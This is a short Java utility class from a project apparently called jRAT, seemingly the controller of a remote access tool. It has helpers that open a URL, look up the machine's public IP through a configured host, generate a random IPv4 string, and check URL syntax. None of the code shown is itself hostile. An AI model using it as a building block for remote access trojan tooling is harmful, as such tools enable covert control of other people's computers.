package jrat.controller.utils;

import jrat.controller.Constants;
import jrat.controller.ErrorDialog;

import java.awt.*;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URI;
import java.net.URL;
import java.net.URLConnection;


public class NetUtils {

	public static void openUrl(String str) {
		try {
			Desktop.getDesktop().browse(new URI(str));
		} catch (Exception ex) {
			ex.printStackTrace();
			ErrorDialog.create(ex);
		}
	}

	public static String getIP() throws Exception {
		URLConnection uc = new URL(Constants.HOST + "/api/ip").openConnection();
		uc.connect();

		BufferedReader reader = new BufferedReader(new InputStreamReader(uc.getInputStream()));
		String ip = reader.readLine();
		reader.close();

		return ip;
	}

	public static String randomizeIP() {
		int i = (short) (int) (Math.random() * 256.0D);
		int j = (short) (int) (Math.random() * 256.0D);
		int k = (short) (int) (Math.random() * 256.0D);
		int m = (short) (int) (Math.random() * 256.0D);
		return i + "." + j + "." + k + "." + m;
	}
	
	public static boolean isURL(String s) {
		try {
			new URL(s);
			return true;
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		return false;
	}

}
